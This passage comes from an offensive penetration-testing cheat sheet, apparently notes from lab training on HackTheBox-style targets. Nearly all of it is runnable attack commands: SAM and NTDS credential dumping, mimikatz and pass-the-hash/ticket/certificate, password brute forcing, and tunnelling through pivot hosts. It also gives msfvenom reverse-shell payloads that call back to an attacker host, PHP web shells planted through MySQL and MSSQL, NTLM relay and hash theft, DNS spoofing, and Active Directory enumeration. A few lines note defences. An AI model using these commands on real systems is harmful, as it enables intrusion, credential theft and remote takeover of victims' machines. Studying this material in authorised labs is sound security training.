runas /savecred /user:<DOMAIN>\<USER> cmd

# NTDS.dit (on a DC or from a backup)
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds" q q
```

```bash
secretsdump.py -sam SAM.SAV -system SYSTEM.SAV -security SECURITY.SAV LOCAL
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

Network credential hunting:

```bash
# Capture traffic and parse cleartext credentials
sudo tcpdump -i <IFACE> -s 65535 -w capture.pcap
./Pcredz -f capture.pcap -t -v

# SMB share hunting
nxc smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --content --pattern "passw"
```

```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public
```

Pass-the-Hash (PtH):

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /run:cmd.exe" exit
```

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "whoami" -Verbose
Invoke-WMIExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "whoami"
```

```bash
impacket-psexec <USER>@<TARGET> -hashes :<NTLM_HASH>
evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>
xfreerdp /v:<TARGET> /u:<USER> /pth:<NTLM_HASH>
```

Pass-the-Ticket (PtT):

```text
# Windows — Rubeus
Rubeus.exe triage
Rubeus.exe dump /luid:<LUID> /service:krbtgt
Rubeus.exe ptt /ticket:<BASE64_TICKET>
klist
```

```bash
# Linux — keytab / ccache
klist -k -t <USER>.keytab
kinit <USER>@<DOMAIN> -k -t <USER>.keytab
klist
export KRB5CCNAME=/path/to/krb5cc_<UID>
smbclient //<DC>/<SHARE> -k -c ls
impacket-ticketConverter krb5cc_<UID> <USER>.kirbi
```

Pass-the-Certificate:

```bash
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs -smb2support \
  --template KerberosAuthentication
python3 printerbug.py <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET> <ATTACKER_IP>

git clone https://github.com/dirkjanm/PKINITtools.git
python3 gettgtpkinit.py -cert-pfx <CERT>.pfx -dc-ip <DC_IP> '<DOMAIN>/<USER>' /tmp/<USER>.ccache
export KRB5CCNAME=/tmp/<USER>.ccache
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator \
  '<DOMAIN>/<USER>'@<DC_FQDN>
```

Certificate services are high-impact: request a certificate for a privileged account, use PKINIT to get a TGT, then DCSync.

### Medusa & Custom Wordlists

Medusa:

```bash
medusa -h <TARGET> -U usernames.txt -P passwords.txt -M ssh
medusa -h <TARGET> -U usernames.txt -P passwords.txt -M ftp -t 5
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
medusa -h <TARGET> -U usernames.txt -e ns -M <SERVICE>
```

Custom wordlists:

```bash
# Username variants from a name
./username-anarchy Jane Smith > jane_usernames.txt

# Interactive custom password list
cupp -i

# Website keywords
cewl https://<TARGET> -d 4 -m 6 --lowercase -w site.wordlist

# Rules / mutations
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

Filter generated passwords to match the policy, and respect lockout thresholds. Prefer spraying one password across many users over brute-forcing one account.

### Attack Types, Policy & Defense

- **Brute force** — try every value in a keyspace (short PINs, small OTP spaces).
- **Dictionary** — try a wordlist of likely passwords.
- **Hybrid** — wordlist plus mutations/rules (case, numbers, symbols).
- **Password spraying** — one or a few passwords across many users; avoids lockout.
- **Credential stuffing** — reuse credentials from breaches; watch for MFA and lockouts.

Before attacking, enumerate the policy and lockout threshold:

```bash
crackmapexec smb <DC> -u <USER> -p '<PASSWORD>' --pass-pol
rpcclient -U "" -N <DC> -c "querydominfo"
ldapsearch -h <DC> -x -b "DC=<DOMAIN>,DC=<TLD>" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Check for MFA, CAPTCHA, rate limits, and account lockout. Prefer spraying with a single candidate and a delay. Defensively, enforce MFA, strong password policy, lockout thresholds, breached-password checks, and monitoring for distributed spraying. Password managers reduce reuse; never store cleartext credentials in world-readable files.

## 8. Pivoting, Tunneling & Port Forwarding

### SSH Local Port Forwarding

```
# netstat -r or ip route.
# Executing the Local Port Forward:---> We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port
ssh -L AnyLocalPort:localhost:DestinationPort username@DestinationIP
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64  --> Forwarding Multiple Ports

ssh -L localhost:AnyLocalPort:DestinationIP:DestinationPort username@<JUmServerIP/MIddleServerIP>
ssh -L AnyLocalPort:localhost:DestinationPort -L AnyLocalPort2:localhost:DestinationPort2 username@DestinationIP

# To Verify the local port forwarding
netstat -antp | grep 1234
nmap -v -sV -pLocalPort localhost
```

### SSH Dynamic Port Forwarding (SOCKS)

<img width="2108" height="1184" alt="22" src="https://github.com/user-attachments/assets/aa4019a7-fc9f-497f-b9c7-d537936f17f3" />

```
# Enabling Dynamic Port Forwarding with SSH:---> dynamic port forwarding, where we can send packets to a remote network via a pivot host.
1) ssh -D AnyLocalPort(9050) username@DestinationIP
2) Checking /etc/proxychains.conf
tail -4 /etc/proxychains.conf
	# meanwhile
	# defaults set to "tor"
	socks4 	127.0.0.1 9050

# Now when you start Nmap with proxychains using the command below, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.
3) Using Nmap with Proxychains (SOCKS tunneling
	proxychains nmap -v -sn 172.16.5.1-200

	# Enumerating the Windows Target through Proxychains (Windows Defender firewall blocks ICMP requests (traditional pings) by default.)
	proxychains nmap -v -Pn -sT 172.16.5.19
	proxychains4 -f /home/kali/recon/proxychains.conf nmap -v -Pn -sT 172.16.5.19

# Using Metasploit with Proxychains
proxychains msfconsole
msf6 > search rdp_scanner
msf6 > use 0

# Using xfreerdp with Proxychains
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:<PASSWORD>

```

### SSH Remote/Reverse Port Forwarding

```
#Creating a Windows Payload with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

#Configuring & Starting the multi/handler
use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0(ourhackingmachine)
msf6 exploit(multi/handler) > set lport 8000(listenByOurHackingMachinePort)
msf6 exploit(multi/handler) > run

#Transferring Payload to Pivot Host
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

# Starting Python3 Webserver on Pivot Host to make windows target machine access http download url from pivot machine
python3 -m http.server 8123

#Downloading Payload on the Windows Target
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

# Using SSH -R |  Remote/Reverse Port Forwarding with SSH  --> The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.
>$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN

Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.

```

### Meterpreter Tunneling & Port Forwarding

```
# we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the command below, which will return a shell on our attack host on port 8080.
# Creating Payload for Ubuntu Pivot Host
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

# Before copying the payload over, we can start a multi/handler, also known as a Generic Payload Handler.
# Configuring & Starting the multi/handler
msf6 > use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run

# We can copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.
	-> ls
	-> chmod +x backupjob
	-> ./backupjob

# Meterpreter Session Establishment
meterpreter > pwd

#  **firewall allowing ping (ICMP) **
# Ping Sweep
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
# OR
for linux
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
# OR
for windows cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
# OR
for windows powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}

#  **IF firewall blocks ping (ICMP) **
# In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host. We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
# Configuring MSF's SOCKS Proxy
	-> meterpreter > bg
	-> use auxiliary/server/socks_proxy
	-> set SRVPORT 9050
	-> set SRVHOST 0.0.0.0
	-> set version 4a
	-> run
	-> options
	-> jobs

# After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the line below at the end of our proxychains.conf file located at /etc/proxychains.conf if it isn't already there.
# Adding a Line to proxychains.conf if Needed
-> socks4  127.0.0.1 9050

# Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
# Creating Routes with AutoRoute
msf6 > use post/multi/manage/autoroute
> set SESSION 1
> set SUBNET 172.16.5.0
> run

# It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
meterpreter > sessions -i 1
meterpreter > run autoroute -s 172.16.5.0/23

# Listing Active Routes with AutoRoute (After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected.
)
meterpreter > run autoroute -p

# Testing Proxy & Routing Functionality
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

----------------------------------------------------------------------------
# Port Forwarding with Meterpreter
# Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
meterpreter > help portfwd
# Creating Local TCP Relay (The command below requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.)
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

# Connecting to Windows Target through localhost
xfreerdp /v:localhost:3300 /u:victor /p:<PASSWORD>

netstat -antp

----------------------------------------------------------------------------
# Meterpreter Reverse Port Forwarding
# We can create a reverse port forward on our existing shell from the previous scenario using the command below. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.
# Reverse Port Forwarding Rules
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

# Configuring & Starting multi/handler
meterpreter > bg
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
> set LPORT 8081
> set LHOST 0.0.0.0
> run
# We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host's ip:8081 that we configured.

# Generating the Windows Payload
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

# Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.
# Establishing the Meterpreter session
meterpreter > shell

```

### Socat Redirection — Reverse Shell

```
# We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu(pivot) server.
# Starting Socat Listener on a Ubuntu(pivot) server.
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18).
# Creating the Windows Payload from our attack host
user@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

# Configuring & Starting the multi/handler on our attack host
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
 run
```

### Socat Redirection — Bind Shell

```
# We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.
# Creating the Windows Payload
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

# Starting Socat Bind Shell Listener on a Ubuntu(pivot) server.
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# Configuring & Starting the Bind multi/handler on our attacker host
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

### Rpivot

```
attack machine -> git clone https://github.com/klsecservices/rpivot.git
attack machine -> python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
attack machine -> scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/

Pivot machine -> python2 client.py --server-ip 10.10.14.18 --server-port 9999

attack machine -> configure proxychains
attack machine -> proxychains nmap IP -pPort
attack machine -> proxychains firefox-esr 172.16.5.135:80
attack machine -> proxychains curl --noproxy '*' http://172.16.5.135:80

## Connecting to a Web Server using HTTP-Proxy & NTLM Auth ---> here could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way

Pivot machine -> python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>

```

### Windows netsh Port Proxy

```
- 10.10.16.83 #kali ip
- ( 10.129.42.198 # Windows public IP and 172.16.5.150 # Windows private IP)
- 172.16.5.19 # DC01/victor machine

# from windows public IP (after pwn the pivot host)
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.19
# Verifying Port Forward from the pwn the pivot host
netsh.exe interface portproxy show v4tov4

# then go to the attacker host
xfreerdp /v:10.129.42.198:8080 /u:victor /p:<PASSWORD>

```

### Dnscat2 DNS Tunneling

```
# from attack host (server side):-
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

# Then cloning the client script to attack host too.
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# copy the dnscat2-powershell.py script to the pivot host or the victim host

# from pivot/victim host (client side):-
- Import-Module .\dnscat2.ps1
- Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <PRE_SHARED_SECRET> -Exec cmd
		dnscat2> ?
		dnscat2> window -i 1
```

### Chisel SOCKS5

#### Build and Serve

```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
# OR static build
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o chisel_static
file chisel_static
scp chisel ubuntu@10.129.202.64:~/
```

#### Reverse SOCKS Proxy (Pivot as Server)

```bash
# On the pivot host
./chisel server -v -p 1234 --socks5

# On the attack host
./chisel client -v 10.129.202.64:1234 socks
```

Point proxychains at the local SOCKS listener:

```bash
sudo nano /etc/proxychains4.conf
# socks4 127.0.0.1 9050
socks5 127.0.0.1 1080
```

```bash
proxychains xfreerdp /v:172.16.5.19 /u:<USER> /p:'<PASSWORD>'
```

#### Chisel Reverse Pivot (Attack Host as Server)

Use this when firewall rules block inbound connections to the pivot.

```bash
# Attack host
sudo ./chisel server --reverse -v -p 1234 --socks5

# Pivot host
./chisel client -v 10.10.14.17:1234 R:socks
```

Confirm proxychains:

```bash
tail -f /etc/proxychains.conf
# socks4 127.0.0.1 9050
socks5 127.0.0.1 1080
```

```bash
proxychains xfreerdp /v:172.16.5.19 /u:<USER> /p:'<PASSWORD>'
```

### ICMP Tunneling (ptunnel-ng)

```
# Run these commands on your attacker machine, not on the pivot.
sudo apt update
sudo apt install -y git build-essential automake autoconf
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
sudo ./autogen.sh
ls -l src/ptunnel-ng

# Transfer the files to the pivot
scp -r ptunnel-ng ubuntu@10.129.202.64:~/

# Step 4 — Start the ICMP tunnel server on the pivot
cd ~/ptunnel-ng/src
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Step 5 — Start the tunnel client on the attacker
cd ~/ptunnel-ng/src
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# Step 6 — Test SSH through the tunnel
ssh -p 2222 -l ubuntu 127.0.0.1
# OR
ssh -D 9050 -p 2222 -l ubuntu 127.0.0.1

# Step 7 — Configure ProxyChains
sudo nano /etc/proxychains4.conf
socks5 127.0.0.1 9050

# Step 8 — Test access to the internal RDP port
proxychains nmap -sV 172.16.5.19 -p3389
proxychains4 nmap -sT -Pn -n -sV -p 3389 172.16.5.19

# Connect to RDP
proxychains xfreerdp /v:172.16.5.19
proxychains4 xfreerdp /v:172.16.5.19 /u:USERNAME

```

### Windows & Additional Pivoting

`plink.exe` (PuTTY's Windows SSH client):

```cmd
plink.exe -ssh -D 9050 <USER>@<PIVOT>
plink.exe -ssh -R 8080:127.0.0.1:80 <USER>@<PIVOT>
```

`sshuttle` (VPN-like forwarding over SSH, no SOCKS proxy):

```bash
sudo apt-get install sshuttle
sudo sshuttle -r <USER>@<PIVOT> <INTERNAL_SUBNET> -v
sudo nmap -v -A -sT -p3389 <INTERNAL_IP> -Pn
```

SocksOverRDP (SOCKS over an RDP session):

```cmd
regsvr32.exe SocksOverRDP-Plugin.dll
netstat -antb | findstr 1080
```

Then point proxychains at `127.0.0.1:1080`. Use the matching SocksOverRDP client on the attack host.

Detection and prevention:

- Egress filtering and allowlists for outbound SSH/RDP.
- Proxy/DNS logs, anomalous long-lived connections, and tunnels over unusual ports.
- Restrict SSH forwarding (`AllowTcpForwarding no`), disable unused RDP, and monitor for `plink`/`sshuttle` binaries.
- Network segmentation and host-based firewall rules.

## 9. Attacking Common Services

### Service Misconfigurations & Sensitive Information

Common service misconfigurations:

| Service | Checks |
|---|---|
| FTP | Anonymous login, writable directories, version CVEs |
| SMB | Null sessions, guest access, share permissions, signing |
| SQL | Default/weak `sa`, `xp_cmdshell`, linked servers |
| RDP | NLA, weak credentials, BlueKeep-style CVEs |
| DNS | Zone transfers, recursion, cache poisoning |
| SMTP | Open relay, user enumeration (VRFY/RCPT) |
| SNMP | Default community strings, readable OIDs |
| NFS | `no_root_squash`, world-readable exports |

Finding sensitive information:

```bash
# Service banners and versions
nmap -sV -sC -p- <TARGET>

# Web/config/backup files
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ \
  -u http://<TARGET>/FUZZ -e .bak,.old,.zip,.config,.env

# Anonymous shares
smbclient -N -L //<TARGET>
```

Check discovered versions against CVEs (`searchsploit <product> <version>`, NVD, vendor advisories) and validate the exploit before running it. Default credentials and anonymous access are common findings; document them with evidence.

### FTP

```
# Brute Forcing
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
hydra -L users.txt -P passwords.txt -s 21 ftp://10.1.1.1

# FTP Bounce Attack
nmap -Pn -v -n -p80 -b anonymous:<PASSWORD>@10.10.110.213 172.17.0.2
```

### SMB

```
# Null-session with the rpcclient.
rpcclient -U'%' 10.10.110.17

# Execute a command over the SMB service using crackmapexec.
crackmapexec smb 10.10.110.17 -u Administrator -p '<PASSWORD>' -x 'whoami' --exec-method smbexec
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p '<PASSWORD>' --local-auth
impacket-psexec administrator:'<PASSWORD>'@10.10.110.17

# Enumerating Logged-on Users
crackmapexec smb 10.10.110.0/24 -u administrator -p '<PASSWORD>' --loggedon-users

# Extract hashes from the SAM database.
crackmapexec smb 10.10.110.17 -u administrator -p '<PASSWORD>' --sam

# Pass-the-Hash (PtH) Technique
crackmapexec smb 10.10.110.17 -u Administrator -H <NTLM_HASH>

# Dump the SAM database using impacket-ntlmrelayx.
cat /etc/responder/Responder.conf | grep 'SMB ='
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

# Execute a PowerShell based reverse shell using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>
```

### SQL (MySQL & MSSQL)

```
# SQLEXPRESS
EXECUTE sp_configure 'show advanced options', 1
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell 'whoami'

# MySQL - Write Local File
SELECT @@version_compile_os;
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
# MySQL - Secure File Privileges
show variables like "secure_file_priv";

# MSSQL - Enable Ole Automation Procedures
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

# MSSQL - Create a File
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO

# Read Local Files
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
# MySQL - Read Local Files in MySQL
mysql> select LOAD_FILE("/etc/passwd");
mysql> SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");

# Hash stealing using the xp_dirtree command in MSSQL.
EXEC master..xp_dirtree '\\10.10.110.17\share\'

# Hash stealing using the xp_subdirs command in MSSQL.
EXEC master..xp_subdirs '\\10.10.110.17\share\'

# Retrieve the hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support

# Identify Users that We Can Impersonate
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

# Verifying our Current User and Role
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

# Impersonating the SA User
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

# Identify linked Servers in MSSQL
SELECT srvname, isremote FROM sysservers

# Identify the user and its privileges used for the remote connection in MSSQL.
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```

### RDP

```
nmap -Pn -p3389 192.168.2.143

# Crowbar and Hydra - RDP Password Spraying
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c '<PASSWORD>'
hydra -L usernames.txt -p '<PASSWORD>' 192.168.2.143 rdp

# RDP Login
rdesktop -u admin -p <PASSWORD> 192.168.2.143

# RDP Session Hijacking
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
query user
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack

# RDP Pass-the-Hash (PtH)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp /v:192.168.220.152 /u:lewen /pth:<NTLM_HASH>

```

### DNS

```
nmap -p53 -Pn -sV -sC 10.10.110.213

# DNS Zone Transfer - DIG - AXFR Zone Transfer
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
fierce --domain zonetransfer.me

# Domain Takeovers & Subdomain Enumeration
./subfinder -d inlanefreight.com -v

git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
python3 subbrute.py inlanefreight.htb -s names.txt -r resolvers.txt

host support.inlanefreight.com

# Reference: https://github.com/EdOverflow/can-i-take-over-xyz

# DNS Spoofing
> cat /etc/ettercap/etter.dns  >>> to be >>> targetdomain.io	A	Attacker_IP
> Start Ettercap
> navigating to Hosts > Scan for Hosts. Once completed, add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2.
> Activate dns_spoof attack by navigating to Plugins > Manage Plugins. This sends the target machine with fake DNS responses that will resolve inlanefreight.com to IP address 192.168.225.110:
> After a successful DNS spoof attack, if a victim user coming from the target machine 192.168.152.129 visits the inlanefreight.com domain on a web browser, they will be redirected to a Fake page that is hosted on IP address 192.168.225.110:

> ping inlanefreight.com

```

### Email (SMTP & POP3)

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

# MX records
host -t MX microsoft.com
dig mx inlanefreight.com | grep "MX" | grep -v ";"

# A record for a mail host
host -t A mail1.inlanefreight.htb.

# SMTP interaction — VRFY, EXPN, RCPT TO, USER
telnet 10.10.110.20 25

# SMTP user enumeration with RCPT
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

# Cloud mail services: o365spray (O365), MailSniper (O365), CredKing (Gmail/Okta)
python3 o365spray.py --validate --domain msplaintext.xyz
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
python3 o365spray.py --spray -U usersfound.txt -p '<PASSWORD>' --count 1 --lockout 1 --domain msplaintext.xyz

# POP3 brute force
hydra -L users.txt -p '<PASSWORD>' -f 10.10.110.20 pop3

# SMTP open relay
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
```

## 10. Active Directory

### Initial Enumeration

```
# Dump credentials with Mimikatz:
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Responder
sudo responder -I ens224 -A

# Inveigh
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
# OR
.\Inveigh.exe
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES

# Performs a ping sweep on the specified network segment from a Linux-based host
fping -asgq 172.16.5.0/23

# Enumerate usernames with Kerbrute against the domain and DC, writing results to a file.
./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
```

### LLMNR/NBT-NS Poisoning

```
# Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

### Password Spraying & Password Policy

```
# Uses CME to extract password policy
crackmapexec smb 172.16.5.5 -u avazquez -p <PASSWORD> --pass-pol

# Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host.
rpcclient -U "" -N 172.16.5.5

# Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host.
rpcclient $> querydominfo

# Using enum4linux
enum4linux -P 172.16.5.5
enum4linux-ng -P 172.16.5.5 -oA ilfreight

# Using Enumerating Null Session - from Windows | see the different responses for different usernames.
net use \\DC01\ipc$ "" /u:""
net use \\DC01\ipc$ "<PASSWORD>" /u:guest

# Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# Used to enumerate the password policy in a Windows domain from a Windows-based host.
net accounts

# PowerView Command used to enumerate the password policy in a target Windows domain from a Windows-based host.
import-module .\PowerView.ps1
Get-DomainPolicy

# Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.
rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser

# Using enum4linux to implement null session to extract users
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.
crackmapexec smb 172.16.5.5 --users
# OR
# crackmapexec to check the valid credentials for  Domain User Enumeration
sudo crackmapexec smb 172.16.5.5 -u htb-student -p <PASSWORD> --users

# Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

